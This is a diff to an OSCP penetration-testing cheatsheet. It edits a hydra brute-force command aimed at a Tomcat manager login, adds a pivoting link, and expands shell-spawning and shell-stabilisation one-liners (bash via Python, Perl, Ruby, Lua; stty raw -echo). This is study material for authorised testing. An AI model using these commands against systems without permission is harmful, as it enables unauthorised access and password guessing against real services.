@@ -190,6 +190,7 @@ description: "OSCP personal cheatsheet"
   * [John](#john)
   
 - [PIVOTING](#pivoting)
+  
   * [Sshuttle](#sshuttle)
   * [Proxychains](#proxychains)
   
@@ -509,7 +510,7 @@ admin:tomcat
 #### Brute force 
 
 ```
-hydra -L <USERS_LIST> -P <PASSWORDS_LIST> -f <IP> http-get /manager/html -vV
+hydra -L <USERS_LIST> -P <PASSWORDS_LIST> -f <IP> http-get /manager/html -vV -u
 ```
 
 #### Tomcat panel RCE
@@ -1590,6 +1591,12 @@ ssh -f -N -D 9050 <USER>@<IP>
 proxychains <COMMAND>
 ```
 
+### Interesting link
+
+```
+https://artkond.com/2017/03/23/pivoting-guide/
+```
+
 ------
 
 ## PRIVILE ESCALATION
@@ -2138,22 +2145,36 @@ http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 ### Interactive shell
 
 ```
+# Python
 python -c 'import pty; pty.spawn("/bin/bash")'
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 
+# Bash
 echo os.system('/bin/bash')
+
+# Sh
+/bin/bash -i
+
+# Perl
+perl -e 'exec "/bin/bash"'
+
+# Ruby
+exec "/bin/bash"
+
+# Lua
+os.execute('/bin/bash')
 ```
 
 ### Adjust Interactive shell
 
 ```
+stty size # Find your terminal size -> 50 235
 Ctrl-Z
-echo $TERM    //find term
-stty raw -echo  //disable shell echo
+stty raw -echo  // Disable shell echo
 fg
-reset
 export SHELL=bash
-export TERM=xterm
+export TERM=xterm OR export TERM=xterm-256color
+stty rows 50 columns 235
 ```
 
 ------
